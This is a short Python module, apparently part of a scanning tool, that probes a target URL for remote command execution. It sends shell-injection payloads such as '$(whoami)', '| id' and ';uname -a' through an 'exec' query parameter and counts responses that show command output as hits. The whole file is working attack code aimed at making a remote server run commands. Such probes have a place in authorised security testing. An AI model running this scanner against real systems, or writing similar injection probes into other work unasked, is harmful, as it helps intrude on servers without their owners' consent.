import requests

def run(target):
    payloads = [
        "`whoami`",
        "$(whoami)",
        "| id",
        "|| ls",
        ";uname -a"
    ]

    reflections = 0
    hits = 0
    sent = 0

    for payload in payloads:
        try:
            url = f"{target}?exec={payload}"
            r = requests.get(url, timeout=6)
            sent += 1
            if "uid=" in r.text or "Linux" in r.text or "root" in r.text:
                hits += 1
            if payload in r.text:
                reflections += 1
        except:
            continue

    return {
        "module": "fuzz_rce",
        "payloads_sent": sent,
        "reflections": reflections,
        "hits": hits,
        "notes": "Remote Code Execution detection"
    }
